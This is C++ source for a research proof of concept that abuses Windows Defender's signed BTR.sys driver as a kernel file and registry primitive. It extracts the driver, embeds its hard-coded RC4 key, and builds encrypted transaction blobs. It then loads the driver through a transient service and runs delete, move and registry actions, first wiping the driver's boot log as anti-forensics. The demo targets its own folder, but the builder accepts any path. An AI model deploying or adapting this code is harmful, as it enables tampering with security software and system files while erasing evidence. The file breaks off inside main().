/*
 * btrpoc.cpp - "BTR Reforged" research PoC (demonstration).
 *
 * Technique: abuse of Windows Defender's Boot-Time-Removal driver BTR.sys as a
 * signed, WDAC-immune Ring-0 file/registry primitive.
 *   paper:   research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-
 *            remediation-driver-as-a-kernel-operation-primitive/
 *   ref:     github.com/Dump-GUY/BTR_CLI  (MIT)  - Jiří Vinopal / Check Point
 *
 * BTR.sys is embedded as a PE resource ("PACKEDBINARY"/"BOOTTIMETOOL") inside
 * MpEngine.dll and dropped on demand by Windows Defender. It exposes no IOCTL;
 * instead it reads an RC4-encrypted transaction blob from the ADS
 * "<driver>.sys:changelist" whose path is given by its service key's "Args"
 * value, validates each region with a modified CRC-32 (~CRC32: standard
 * 0xEDB88320 polynomial, init 0xFFFFFFFF, NO final XOR), executes the items and
 * writes a feedback report, then returns STATUS_DELETE_PENDING to self-unload.
 *
 * This PoC is a *demonstration* of the protocol and pipeline:
 *
 *   scan    - locate MpEngine.dll, extract the embedded BTR.sys, verify the
 *             hard-coded RC4 key is present and that the image is signed.
 *   verify  - build a full transaction (Global Header + Feedback path + items),
 *             print every field and ~CRC32, and RC4-encrypt it. Does NOT load
 *             anything - pure protocol walk-through.
 *   demo    - stage the driver + ADS config, create the transient service and
 *             load BTR.sys via NtLoadDriver, then run a *benign, self-owned*
 *             action chain (move file / delete file / set+delete a registry
 *             key under HKLM\SOFTWARE\BTRPoC), print the driver's feedback
 *             report, verify the effects and clean everything up.
 *
 * The action targets are hard-wired to the PoC's own workspace
 * (C:\ProgramData\btrpoc) and its own registry key. The real-world abuse case -
 * Ring-0 deletion of WdFilter.sys / MsMpEng.exe / Defender service keys - is
 * deliberately NOT implemented here (see README, "Detection").
 *
 * Requires Administrator (SeLoadDriverPrivilege). Authorised lab use only.
 */

#ifndef _WIN64
#  error "x64 only"
#endif

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <wchar.h>
#include <string>
#include <vector>

// ------------------------------------------------------------------ constants

static const uint32_t BTR_MAGIC   = 0xFEE1DEAD;
static const uint32_t BTR_VERSION = 2;
static const uint32_t BTR_PAYLOAD_OFFSET = 0x10;

static const wchar_t *BASE_DIR    = L"C:\\ProgramData\\btrpoc";
static const wchar_t *DEMO_SUBKEY = L"HKLM\\SOFTWARE\\BTRPoC";
static const wchar_t *BOOTLOG     = L"\\SystemRoot\\Temp\\BootClean.log";

/* the verified 256-byte RC4 key - identical in every BTR.sys build since Win7 */
static const uint8_t RC4_KEY[256] = {
    0x1e,0x87,0x78,0x1b,0x8d,0xbb,0xa8,0x44,0xce,0x69,0x70,0x2c,0x0c,0x78,0xb7,0x86,
    0xa3,0xf6,0x23,0xb7,0x38,0xf4,0xed,0xf9,0xaf,0x83,0x53,0x0f,0xb3,0xfc,0x54,0xfa,
    0xa2,0x1e,0xb9,0xcf,0x13,0x32,0xfd,0x0f,0x0d,0xa9,0x54,0xf6,0x87,0xcb,0x9e,0x18,
    0x27,0x96,0x97,0x90,0x0e,0x54,0xfb,0x31,0x7c,0x9c,0xbc,0xe4,0x8e,0x23,0xd0,0x53,
    0x71,0xec,0xc1,0x59,0x51,0xb7,0xf3,0x64,0x9d,0x7c,0xa3,0x3e,0xd6,0x8d,0xc9,0x04,
    0x7e,0x82,0xc9,0xba,0xad,0x96,0x99,0xd0,0xd4,0x58,0xcb,0x84,0x7c,0xa9,0xff,0xbe,
    0x3c,0x8a,0x77,0x52,0x33,0x55,0x7d,0xde,0x13,0xa8,0xb1,0x40,0x87,0xcc,0x1b,0xc8,
    0xf1,0x0f,0x6e,0xcd,0xd0,0x83,0xa9,0x59,0xcf,0xf8,0x4a,0x9d,0x1d,0x50,0x75,0x5e,
    0x3e,0x19,0x18,0x18,0xaf,0x23,0xe2,0x29,0x35,0x58,0x76,0x6d,0x2c,0x07,0xe2,0x57,
    0x12,0xb2,0xca,0x0b,0x53,0x5e,0xd8,0xf6,0xc5,0x6c,0xe7,0x3d,0x24,0xbd,0xd0,0x29,
    0x17,0x71,0x86,0x1a,0x54,0xb4,0xc2,0x85,0xa9,0xa3,0xdb,0x7a,0xca,0x6d,0x22,0x4a,
    0xea,0xcd,0x62,0x1d,0xb9,0xfb,0xa2,0x2e,0xd1,0xe9,0xe1,0x1d,0x75,0xbe,0xd7,0xdc,
    0x0e,0xcb,0x0a,0x8e,0x68,0xc2,0xff,0x12,0x63,0x40,0x8d,0xc8,0x08,0xdf,0xfd,0x16,
    0x4b,0x11,0x67,0x74,0xcd,0x6b,0x9b,0x8d,0x05,0x41,0x1e,0xd6,0x26,0x2e,0x42,0x9b,
    0xa4,0x95,0x67,0x6b,0x83,0x98,0xdb,0x2f,0x35,0xd3,0xc1,0xb9,0xce,0xd5,0x26,0x36,
    0xf2,0x76,0x5e,0x1a,0x95,0xcb,0x7c,0xa4,0xc3,0xdd,0xab,0xdd,0xbf,0xf3,0x82,0x53
};

#pragma pack(push, 1)
struct GLOBAL_HEADER {
    uint32_t Magic, Version, PayloadOffset, GlobalCRC, TransID_Low, TransID_High;
};
struct ITEM_HEADER {
    uint32_t DataSize, Action, HeaderCRC, DataCRC;
};
#pragma pack(pop)

// ------------------------------------------------------------------- helpers

static std::string W2A(const std::wstring &w)
{
    if (w.empty()) return "";
    int n = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), NULL, 0, NULL, NULL);
    std::string s(n, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), &s[0], n, NULL, NULL);
    return s;
}
static std::wstring A2W(const std::string &s)
{
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), NULL, 0);
    std::wstring w(n, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
    return w;
}

/* ~CRC32: standard CRC-32/reflected (0xEDB88320, init 0xFFFFFFFF) but with the
   final inversion step omitted - the exact variant BTR.sys validates with. */
static uint32_t BtrCrc32(const void *data, size_t size, uint32_t initial = 0xFFFFFFFF)
{
    uint32_t crc = initial;
    const uint8_t *p = (const uint8_t *)data;
    for (size_t i = 0; i < size; i++) {
        crc ^= p[i];
        for (int j = 0; j < 8; j++)
            crc = (crc & 1) ? (crc >> 1) ^ 0xEDB88320 : (crc >> 1);
    }
    return crc;   /* no final XOR */
}

static void RC4(std::vector<uint8_t> &data, const uint8_t *key, size_t keyLen)
{
    uint8_t s[256];
    for (int i = 0; i < 256; i++) s[i] = (uint8_t)i;
    int j = 0;
    for (int i = 0; i < 256; i++) { j = (j + s[i] + key[i % keyLen]) & 0xFF; std::swap(s[i], s[j]); }
    int i = 0; j = 0;
    for (size_t k = 0; k < data.size(); k++) {
        i = (i + 1) & 0xFF; j = (j + s[i]) & 0xFF; std::swap(s[i], s[j]);
        data[k] ^= s[(s[i] + s[j]) & 0xFF];
    }
}

static void AppendWString(std::vector<uint8_t> &buf, const std::wstring &str)
{
    size_t len = (str.length() + 1) * sizeof(wchar_t);
    const uint8_t *p = (const uint8_t *)str.c_str();
    buf.insert(buf.end(), p, p + len);
}
static void AppendDWORD(std::vector<uint8_t> &buf, uint32_t v)
{
    const uint8_t *p = (const uint8_t *)&v;
    buf.insert(buf.end(), p, p + 4);
}

static std::wstring ToNtPath(const std::wstring &path)
{
    if (path.empty()) return L"";
    if (!path.compare(0, 4, L"\\??\\") || !path.compare(0, 11, L"\\SystemRoot") ||
        !path.compare(0, 10, L"\\Registry\\"))
        return path;
    if (!path.compare(0, 4, L"HKLM")) return L"\\Registry\\Machine" + path.substr(4);
    if (!path.compare(0, 4, L"HKCU")) return L"\\Registry\\User" + path.substr(4);
    if (!path.compare(0, 4, L"HKCR")) return L"\\Registry\\Machine\\SOFTWARE\\Classes" + path.substr(4);
    return L"\\??\\" + path;
}

static void InitUnicodeString(UNICODE_STRING *us, const wchar_t *s)
{
    size_t n = wcslen(s);
    us->Length = (USHORT)(n * sizeof(wchar_t));
    us->MaximumLength = (USHORT)((n + 1) * sizeof(wchar_t));
    us->Buffer = (PWSTR)s;
}

static void HexDump(const uint8_t *p, size_t n, const char *indent)
{
    for (size_t i = 0; i < n; i += 16) {
        printf("%s%04zx  ", indent, i);
        for (size_t j = 0; j < 16; j++)
            printf(j < n - i ? "%02x " : "   ", p[i + j]);
        printf(" ");
        for (size_t j = 0; j < 16 && j < n - i; j++) {
            uint8_t c = p[i + j];
            printf("%c", (c >= 0x20 && c < 0x7f) ? c : '.');
        }
        printf("\n");
    }
}

// ------------------------------------------------------- driver extraction

struct DriverInfo {
    std::wstring mpEnginePath;
    bool keyFound = false;
    bool signed_ = false;
    uint32_t size = 0;
    std::string fileDescription, originalFilename;
};

static std::wstring RecursiveFind(const std::wstring &dir, const std::wstring &file)
{
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW((dir + L"*").c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return L"";
    std::wstring result;
    do {
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;
        std::wstring full = dir + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            result = RecursiveFind(full + L"\\", file);
            if (!result.empty()) break;
        } else if (!_wcsicmp(fd.cFileName, file.c_str())) {
            result = full; break;
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
    return result;
}

static std::string ExtractU16String(const uint8_t *buf, size_t n, const char *needle8)
{
    std::wstring needle = A2W(needle8);
    for (size_t i = 0; i + 2 <= n; i += 2) {
        bool ok = true;
        for (size_t k = 0; k < needle.size(); k++) {
            if (i + k * 2 + 2 > n) { ok = false; break; }
            wchar_t c = (wchar_t)(buf[i + k * 2] | (buf[i + k * 2 + 1] << 8));
            if (towlower(c) != towlower(needle[k])) { ok = false; break; }
        }
        if (ok) {
            /* the value follows this name in the version resource, but for a
               quick check we return a marker; full value handled below */
            return "present";
        }
    }
    return "";
}

/* find the embedded BTR.sys resource and drop it to disk */
static bool ExtractDriver(const std::wstring &outPath, DriverInfo &info)
{
    info.mpEnginePath = RecursiveFind(
        L"C:\\ProgramData\\Microsoft\\Windows Defender\\Definition Updates\\", L"MpEngine.dll");
    if (info.mpEnginePath.empty()) {
        printf("[!] MpEngine.dll not found under Defender Definition Updates\n");
        return false;
    }
    printf("[*] MpEngine.dll : %s\n", W2A(info.mpEnginePath).c_str());

    HMODULE h = LoadLibraryExW(info.mpEnginePath.c_str(), NULL, LOAD_LIBRARY_AS_DATAFILE);
    if (!h) { printf("[!] LoadLibraryEx failed (%lu)\n", GetLastError()); return false; }

    HRSRC res = FindResourceW(h, L"BOOTTIMETOOL", L"PACKEDBINARY");
    if (!res) { printf("[!] resource PACKEDBINARY/BOOTTIMETOOL not found\n"); FreeLibrary(h); return false; }

    DWORD size = SizeofResource(h, res);
    const uint8_t *data = (const uint8_t *)LockResource(LoadResource(h, res));
    if (!data || !size) { printf("[!] resource is empty\n"); FreeLibrary(h); return false; }
    info.size = size;

    /* sanity: MZ / PE and the hard-coded RC4 key present in .rdata */
    if (!(size > 0x40 && data[0] == 'M' && data[1] == 'Z')) {
        printf("[!] resource is not a PE image\n"); FreeLibrary(h); return false;
    }
    for (size_t i = 0; i + sizeof(RC4_KEY) <= size; i++) {
        if (!memcmp(data + i, RC4_KEY, sizeof(RC4_KEY))) { info.keyFound = true; break; }
    }
    info.fileDescription  = ExtractU16String(data, size, "Boot Time Removal Tool");
    info.originalFilename = ExtractU16String(data, size, "BTR.sys");

    /* signed? PE DataDirectory[4] = certificate table */
    uint32_t e_lfanew = *(const uint32_t *)(data + 0x3c);
    const uint8_t *opt = data + e_lfanew + 24;
    uint16_t magic = *(const uint16_t *)opt;
    size_t ddBase = (magic == 0x20b) ? 0x70 : 0x60;
    uint32_t secRva  = *(const uint32_t *)(opt + ddBase + 4 * 8);
    uint32_t secSize = *(const uint32_t *)(opt + ddBase + 4 * 8 + 4);
    info.signed_ = (secRva != 0 && secSize != 0);

    CreateDirectoryW(L"C:\\ProgramData\\btrpoc", NULL);
    HANDLE f = CreateFileW(outPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) { printf("[!] can't write %s (%lu)\n", W2A(outPath).c_str(), GetLastError()); FreeLibrary(h); return false; }
    DWORD wrote = 0;
    WriteFile(f, data, size, &wrote, NULL);
    CloseHandle(f);
    FreeLibrary(h);
    return wrote == size;
}

// -------------------------------------------------------- transaction build

struct ActionItem {
    uint32_t action;
    std::wstring source;   // file path or registry key
    std::wstring dest;     // dest path / value name
    std::wstring data;     // registry data
    uint32_t type;         // registry type
};

struct BuiltItem { uint32_t action, dataSize, headerCRC, dataCRC; size_t off; };

static std::vector<uint8_t> ConstructItem(const ActionItem &it, BuiltItem &out)
{
    std::vector<uint8_t> d;
    std::wstring src = ToNtPath(it.source);
    std::wstring dst = ToNtPath(it.dest);
    std::wstring regPath;

    switch (it.action) {
    case 1: case 2:
        AppendWString(d, src);
        break;
    case 3:
        AppendDWORD(d, 0);
        AppendWString(d, src);
        if (dst.empty()) { d.push_back(0); d.push_back(0); }
        else AppendWString(d, dst);
        break;
    case 4:
        AppendDWORD(d, 0);
        AppendWString(d, src);
        break;
    case 5:
        regPath = src + L"\\\\" + it.dest;
        AppendDWORD(d, 0);
        AppendWString(d, regPath);
        break;
    case 6: {
        regPath = src + L"\\\\" + it.dest;
        AppendDWORD(d, 0);
        AppendDWORD(d, it.type);
        std::vector<uint8_t> finalData;
        if (it.type == REG_DWORD || it.type == REG_DWORD_BIG_ENDIAN) {
            uint32_t v = (uint32_t)wcstoul(it.data.c_str(), NULL, 0);
            if (it.type == REG_DWORD_BIG_ENDIAN) v = _byteswap_ulong(v);
            const uint8_t *p = (const uint8_t *)&v; finalData.insert(finalData.end(), p, p + 4);
        } else if (it.type == REG_QWORD) {
            uint64_t v = _wcstoui64(it.data.c_str(), NULL, 0);
            const uint8_t *p = (const uint8_t *)&v; finalData.insert(finalData.end(), p, p + 8);
        } else {
            size_t sz = (it.data.length() + 1) * sizeof(wchar_t);
            const uint8_t *p = (const uint8_t *)it.data.c_str();
            finalData.insert(finalData.end(), p, p + sz);
        }
        AppendDWORD(d, (uint32_t)finalData.size());
        AppendWString(d, regPath);
        d.insert(d.end(), finalData.begin(), finalData.end());
        break;
    }
    }
    for (int i = 0; i < 4; i++) d.push_back(0);   /* mandatory trailing padding */

    ITEM_HEADER ih;
    ih.DataSize  = (uint32_t)d.size();
    ih.Action    = it.action;
    ih.DataCRC   = BtrCrc32(d.data(), d.size());
    ih.HeaderCRC = 0;
    ih.HeaderCRC = BtrCrc32(&ih, sizeof(ih));

    out.action = it.action; out.dataSize = ih.DataSize;
    out.headerCRC = ih.HeaderCRC; out.dataCRC = ih.DataCRC; out.off = 0;

    std::vector<uint8_t> blob;
    const uint8_t *hp = (const uint8_t *)&ih;
    blob.insert(blob.end(), hp, hp + sizeof(ih));
    blob.insert(blob.end(), d.begin(), d.end());
    return blob;
}

/* returns the plaintext config blob; itemInfo lets verify print offsets */
static std::vector<uint8_t> BuildTransaction(const std::vector<ActionItem> &userItems,
                                             const std::wstring &feedbackNT,
                                             std::vector<BuiltItem> &itemInfo)
{
    size_t payLen = (feedbackNT.length() + 1) * sizeof(wchar_t);
    std::vector<uint8_t> payload(payLen);
    memcpy(payload.data(), feedbackNT.c_str(), payLen);

    GLOBAL_HEADER gh;
    memset(&gh, 0, sizeof(gh));
    gh.Magic = BTR_MAGIC;
    gh.Version = BTR_VERSION;
    gh.PayloadOffset = BTR_PAYLOAD_OFFSET;
    gh.TransID_Low  = BtrCrc32(payload.data(), payload.size());
    gh.TransID_High = (uint32_t)payload.size();

    std::vector<uint8_t> blob;
    blob.insert(blob.end(), (uint8_t *)&gh, (uint8_t *)&gh + sizeof(gh));
    blob.insert(blob.end(), payload.begin(), payload.end());

    /* anti-forensics: the driver's own log is always deleted first */
    std::vector<ActionItem> all;
    all.push_back({ 1, BOOTLOG, L"", L"", 0 });
    for (auto &u : userItems) all.push_back(u);

    for (auto &a : all) {
        BuiltItem bi;
        std::vector<uint8_t> ib = ConstructItem(a, bi);
        bi.off = blob.size();
        blob.insert(blob.end(), ib.begin(), ib.end());
        itemInfo.push_back(bi);
    }

    gh.GlobalCRC = BtrCrc32(&gh, sizeof(gh));
    memcpy(blob.data(), &gh, sizeof(gh));
    return blob;
}

// ------------------------------------------------------------ driver load

typedef NTSTATUS (NTAPI *pNtLoadDriver)(PUNICODE_STRING);
typedef NTSTATUS (NTAPI *pNtUnloadDriver)(PUNICODE_STRING);

static bool EnablePrivilege(LPCWSTR name)
{
    HANDLE tok;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) return false;
    LUID luid; TOKEN_PRIVILEGES tp;
    if (!LookupPrivilegeValueW(NULL, name, &luid)) { CloseHandle(tok); return false; }
    tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(tok);
    return ok && err == ERROR_SUCCESS;
}

static bool SetupService(const std::wstring &svcName, const std::wstring &driverPath,
                         const std::wstring &configPath)
{
    std::wstring key = L"SYSTEM\\CurrentControlSet\\Services\\" + svcName;
    HKEY h;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, key.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &h, NULL)
        != ERROR_SUCCESS) return false;

    DWORD type = 1, start = 1, errctl = 0;
    const wchar_t *group = L"Boot Bus Extender";
    std::wstring img = ToNtPath(driverPath);

    RegSetValueExW(h, L"Type", 0, REG_DWORD, (BYTE *)&type, sizeof(type));
    RegSetValueExW(h, L"Start", 0, REG_DWORD, (BYTE *)&start, sizeof(start));
    RegSetValueExW(h, L"ErrorControl", 0, REG_DWORD, (BYTE *)&errctl, sizeof(errctl));
    RegSetValueExW(h, L"Group", 0, REG_SZ, (BYTE *)group, (DWORD)((wcslen(group) + 1) * 2));
    RegSetValueExW(h, L"ImagePath", 0, REG_EXPAND_SZ, (BYTE *)img.c_str(), (DWORD)((img.length() + 1) * 2));
    RegSetValueExW(h, L"Args", 0, REG_SZ, (BYTE *)configPath.c_str(), (DWORD)((configPath.length() + 1) * 2));
    RegCloseKey(h);
    return true;
}

static std::wstring RandomName()
{
    static const wchar_t *hex = L"abcdefghijklmnopqrstuvwxyz";
    std::wstring s;
    DWORD seed = GetTickCount() ^ (DWORD)(uintptr_t)&s;
    srand(seed);
    for (int i = 0; i < 8; i++) s += hex[rand() % 26];
    return s;
}

// ------------------------------------------------------------- feedback

static int ParseReport(const std::wstring &path)
{
    HANDLE f = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) { printf("[!] feedback ADS not readable (%lu)\n", GetLastError()); return -1; }
    DWORD sz = GetFileSize(f, NULL);
    std::vector<uint8_t> buf(sz);
    DWORD rd = 0; ReadFile(f, buf.data(), sz, &rd, NULL); CloseHandle(f);
    buf.resize(rd);

    printf("\n[*] feedback report (%u bytes) @ %s\n", (unsigned)rd, W2A(path).c_str());
    printf("      raw (first 96 bytes, RC4 ciphertext):\n");
    HexDump(buf.data(), buf.size() < 96 ? buf.size() : 96, "      ");

    /* the report is the transaction image, RC4-encrypted, WITHOUT the global
       payload, and with the first 4 bytes of every item's data replaced by that
       item's NTSTATUS */
    std::vector<uint8_t> dec = buf;
    RC4(dec, RC4_KEY, sizeof(RC4_KEY));
    printf("\n      decrypted report (first 160 bytes):\n");
    HexDump(dec.data(), dec.size() < 160 ? dec.size() : 160, "      ");
    if (dec.size() < sizeof(GLOBAL_HEADER) || *(uint32_t *)dec.data() != BTR_MAGIC) {
        printf("      (report not interpretable; raw dump only)\n");
        return 0;
    }
    size_t off = sizeof(GLOBAL_HEADER);
    printf("\n      per-item NTSTATUS (from the driver):\n");
    static const char *act[] = { "", "DeleteFile", "DeleteDir", "Move/Quarantine",
                                 "DeleteKey", "DeleteValue", "SetValue" };
    while (off + sizeof(ITEM_HEADER) <= dec.size()) {
        ITEM_HEADER *ih = (ITEM_HEADER *)(dec.data() + off);
        if (!ih->DataSize || off + sizeof(ITEM_HEADER) + ih->DataSize > dec.size()) break;
        uint32_t status = *(uint32_t *)(dec.data() + off + sizeof(ITEM_HEADER));
        const char *nm = (ih->Action >= 1 && ih->Action <= 6) ? act[ih->Action] : "?";
        printf("      action %u (%-15s) dataSize %-4u STATUS 0x%08X%s\n",
               ih->Action, nm, ih->DataSize, status, status == 0 ? "  success" : "");
        off += sizeof(ITEM_HEADER) + ih->DataSize;
    }
    return 0;
}

// ----------------------------------------------------------------- modes

static void do_scan(void)
{
    DriverInfo info;
    std::wstring out = std::wstring(BASE_DIR) + L"\\BTR.sys";
    printf("\n[*] extracting BTR.sys from MpEngine.dll\n");
    if (!ExtractDriver(out, info)) { printf("[!] extraction failed\n"); return; }

    printf("\n// [1] extracted driver\n");
    printf("      path             : %s\n", W2A(out).c_str());
    printf("      size             : %u bytes\n", info.size);
    printf("      FileDescription  : %s\n", info.fileDescription.empty() ? "-" : info.fileDescription.c_str());
    printf("      OriginalFilename : %s\n", info.originalFilename.empty() ? "-" : info.originalFilename.c_str());
    printf("      MS signature     : %s\n", info.signed_ ? "present (certificate table)" : "ABSENT");
    printf("      RC4 key in .rdata: %s\n", info.keyFound ? "MATCHED" : "MISSING (patched?)");

    printf("\n// [2] note\n");
    printf("      the same 256-byte RC4 key is used by every BTR.sys build since Win7;\n");
    printf("      the transaction format is unchanged across Win7..Win11.\n");
}

static void do_verify(void)
{
    printf("\n[*] protocol walk-through (no driver is loaded)\n");

    std::wstring feedbackNT = ToNtPath(std::wstring(BASE_DIR) + L"\\<rand>.sys:<rand>.dat");
    std::vector<ActionItem> items = {
        { 1, std::wstring(BASE_DIR) + L"\\victim.txt", L"", L"", 0 },
        { 6, DEMO_SUBKEY, L"Marker", L"0x1337", REG_DWORD },
        { 4, DEMO_SUBKEY, L"", L"", 0 },
    };

    std::vector<BuiltItem> bi;
    std::vector<uint8_t> plain = BuildTransaction(items, feedbackNT, bi);

    printf("\n// [1] global header (24 bytes)\n");
    GLOBAL_HEADER *gh = (GLOBAL_HEADER *)plain.data();
    printf("      Magic          : 0x%08X\n", gh->Magic);
    printf("      Version        : %u\n", gh->Version);
    printf("      PayloadOffset  : 0x%X\n", gh->PayloadOffset);
    printf("      GlobalCRC      : 0x%08X   (~CRC32 over header, CRC field zeroed)\n", gh->GlobalCRC);
    printf("      TransID_Low    : 0x%08X   (~CRC32 of feedback path)\n", gh->TransID_Low);
    printf("      TransID_High   : 0x%08X   (byte size of feedback path)\n", gh->TransID_High);

    printf("\n// [2] global payload (feedback file, UTF-16)\n");
    printf("      %s\n", W2A(feedbackNT).c_str());

    printf("\n// [3] items\n");
    for (size_t i = 0; i < bi.size(); i++) {
        printf("      item %zu: action=%u dataSize=%-4u headerCRC=0x%08X dataCRC=0x%08X\n",
               i, bi[i].action, bi[i].dataSize, bi[i].headerCRC, bi[i].dataCRC);
    }

    printf("\n// [4] plaintext blob before encryption (%zu bytes)\n", plain.size());
    HexDump(plain.data(), plain.size() < 128 ? plain.size() : 128, "      ");

    std::vector<uint8_t> enc = plain;
    RC4(enc, RC4_KEY, sizeof(RC4_KEY));
    printf("\n// [5] RC4-encrypted (this blob goes to <driver>.sys:changelist)\n");
    HexDump(enc.data(), enc.size() < 128 ? enc.size() : 128, "      ");

    printf("\n      NOTE: verify stops here - nothing is staged or loaded.\n");
}

static void do_demo(void)
{
    printf("\n[*] BENIGN end-to-end demo\n");
    printf("      targets: %s  and  %s\n", W2A(BASE_DIR).c_str(), W2A(DEMO_SUBKEY).c_str());

    CreateDirectoryW(L"C:\\ProgramData\\btrpoc", NULL);
    std::wstring victim = std::wstring(BASE_DIR) + L"\\victim.txt";
    std::wstring mover  = std::wstring(BASE_DIR) + L"\\move_me.txt";
    std::wstring moved  = std::wstring(BASE_DIR) + L"\\moved.txt";
    DeleteFileW(victim.c_str()); DeleteFileW(mover.c_str()); DeleteFileW(moved.c_str());
    DeleteFileW(std::wstring(BASE_DIR).append(L"\\BTR.sys").c_str());
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\BTRPoC");

    { HANDLE f = CreateFileW(victim.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
      if (f != INVALID_HANDLE_VALUE) { DWORD w; WriteFile(f, "victim", 6, &w, NULL); CloseHandle(f); } }
    { HANDLE f = CreateFileW(mover.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
      if (f != INVALID_HANDLE_VALUE) { DWORD w; WriteFile(f, "move me", 7, &w, NULL); CloseHandle(f); } }
    printf("      prepared victim.txt + move_me.txt\n");

    if (!EnablePrivilege(L"SeLoadDriverPrivilege")) {
        printf("[!] SeLoadDriverPrivilege not available - run as Administrator\n");
        return;
    }

    /* -- extract driver + stage ADS config --------------------------------- */
    std::wstring base = std::wstring(BASE_DIR);
    std::wstring rnd = RandomName();
    std::wstring driverPath = base + L"\\" + rnd + L".sys";
    std::wstring configPath = driverPath + L":changelist";
    std::wstring feedbackDos = driverPath + L":" + rnd + L".dat";

    DriverInfo info;
    if (!ExtractDriver(driverPath, info) || !info.keyFound) {
        printf("[!] could not obtain a verified BTR.sys\n"); return;
    }
    printf("[+] BTR.sys staged at %s (%u bytes)\n", W2A(driverPath).c_str(), info.size);

    std::vector<ActionItem> items = {
        { 3, mover, moved, L"", 0 },                       /* Ring-0 move        */
        { 1, victim, L"", L"", 0 },                        /* Ring-0 delete      */
        { 6, DEMO_SUBKEY, L"Marker", L"0x1337", REG_DWORD },/* Ring-0 reg write   */
        { 4, DEMO_SUBKEY, L"", L"", 0 },                   /* Ring-0 reg key del */
    };
    std::vector<BuiltItem> bi;
    std::vector<uint8_t> blob = BuildTransaction(items, ToNtPath(feedbackDos), bi);
    RC4(blob, RC4_KEY, sizeof(RC4_KEY));

    { HANDLE f = CreateFileW(configPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
      if (f == INVALID_HANDLE_VALUE) { printf("[!] can't write ADS (%lu)\n", GetLastError()); return; }
      DWORD w; WriteFile(f, blob.data(), (DWORD)blob.size(), &w, NULL); CloseHandle(f); }
    printf("[+] RC4 config (%zu bytes) written to ADS %s\n", blob.size(), W2A(configPath).c_str());

    if (!SetupService(rnd, driverPath, configPath)) { printf("[!] service setup failed\n"); return; }
    printf("[+] transient service key created: HKLM\\SYSTEM\\CurrentControlSet\\Services\\%s\n", W2A(rnd).c_str());

    /* -- load -------------------------------------------------------------- */
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtLoadDriver Load = (pNtLoadDriver)(void *)GetProcAddress(ntdll, "NtLoadDriver");
    std::wstring regPath = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + rnd;
    UNICODE_STRING us; InitUnicodeString(&us, regPath.c_str());

    printf("[*] NtLoadDriver ...\n");
    NTSTATUS st = Load(&us);
    printf("[+] NtLoadDriver returned 0x%08X  %s\n", (unsigned)st,
           (unsigned)st == 0xC0000056 ? "(STATUS_DELETE_PENDING = BTR.sys did its work and self-unloaded)" :
           (unsigned)st == 0 ? "(STATUS_SUCCESS)" : "(unexpected)");
    Sleep(800);

    /* -- report + verification -------------------------------------------- */
    ParseReport(feedbackDos);

    printf("\n[*] effects (verified from user mode)\n");
    printf("      victim.txt deleted           : %s\n",
           GetFileAttributesW(victim.c_str()) == INVALID_FILE_ATTRIBUTES ? "YES" : "no");
    printf("      moved.txt created (move)     : %s\n",
           GetFileAttributesW(moved.c_str()) == INVALID_FILE_ATTRIBUTES ? "no" : "YES");
    HKEY k; bool keyGone = (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\BTRPoC", 0, KEY_READ, &k) != ERROR_SUCCESS);
    printf("      HKLM\\SOFTWARE\\BTRPoC removed : %s\n", keyGone ? "YES" : "no");

    /* -- cleanup ----------------------------------------------------------- */
    pNtUnloadDriver Unload = (pNtUnloadDriver)(void *)GetProcAddress(ntdll, "NtUnloadDriver");
    if (Unload) Unload(&us);
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, (L"SYSTEM\\CurrentControlSet\\Services\\" + rnd).c_str());
    DeleteFileW(driverPath.c_str());          /* also removes the ADS streams */
    DeleteFileW(moved.c_str());
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\BTRPoC");
    printf("[+] cleaned up (driver, service key, ADS, artefacts)\n");
}

// ------------------------------------------------------------------ main

static void banner(void)
{
    printf("\n=====================================================================\n");
    printf(" BTR Reforged - BTR.sys as a signed Ring-0 file/registry primitive\n");
    printf(" demonstration PoC (no Defender-targeting payload)\n");
    printf("=====================================================================\n");
}

int main(int argc, char **argv)
{
    banner();
    if (argc < 2) {
        printf("\nusage:\n");
        printf("  btrpoc.exe scan     extract + verify the embedded BTR.sys\n");
        printf("  btrpoc.exe verify   build a transaction, print/encrypt it (no load)\n");
        printf("  btrpoc.exe demo     benign end-to-end run (loads BTR.sys, self-owned targets)\n");
        return 1;
    }
    std::string cmd = argv[1];
    if (cmd == "scan")        { do_scan();   return 0; }
    if (cmd == "verify")      { do_verify(); return 0; }
